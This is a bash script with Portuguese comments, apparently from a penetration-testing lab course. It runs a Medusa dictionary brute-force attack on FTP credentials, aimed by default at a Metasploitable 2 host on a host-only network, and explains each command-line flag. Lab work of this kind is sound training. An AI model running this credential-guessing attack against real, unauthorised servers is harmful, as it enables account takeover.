#!/usr/bin/env bash
# ==============================================================================
# Script: medusa_ftp_audit.sh
# Finalidade: Execução didática de auditoria de credenciais no serviço FTP
# Ferramenta: Medusa v2.2+ no Kali Linux
# Alvo: Metasploitable 2 (Ambiente Host-Only Controlado)
# ==============================================================================

TARGET_IP="${1:-192.168.56.101}"
USER_LIST="../wordlists/users_common.txt"
PASS_LIST="../wordlists/passwords_common.txt"
OUTPUT_FILE="medusa_ftp_result.txt"

echo "=================================================="
echo "[+] Auditoria de Força Bruta / Dicionário em FTP"
echo "[+] Alvo: $TARGET_IP:21"
echo "[+] Usuários: $USER_LIST"
echo "[+] Senhas: $PASS_LIST"
echo "=================================================="

# Verificação prévia da existência dos arquivos
if [[ ! -f "$USER_LIST" ]] || [[ ! -f "$PASS_LIST" ]]; then
    echo "[-] Erro: Arquivos de wordlist não encontrados no caminho relativo ../wordlists/"
    exit 1
fi

# Execução do Medusa
# Parâmetros:
#   -h: Endereço IP do host alvo
#   -U: Caminho para a wordlist de nomes de usuários
#   -P: Caminho para a wordlist de senhas
#   -M: Módulo de serviço a ser auditado (ftp)
#   -t: Número de threads simultâneas por host
#   -f: Encerra o teste para o usuário assim que uma credencial válida for encontrada (stop on first success)
#   -v: Nível de verbosidade (1 a 6)
#   -O: Arquivo de log de saída
echo "[*] Disparando Medusa..."
medusa -h "$TARGET_IP" \
       -U "$USER_LIST" \
       -P "$PASS_LIST" \
       -M ftp \
       -t 4 \
       -f \
       -v 4 \
       -O "$OUTPUT_FILE"

echo -e "\n[+] Auditoria concluida. Relatorio gerado em: $OUTPUT_FILE"
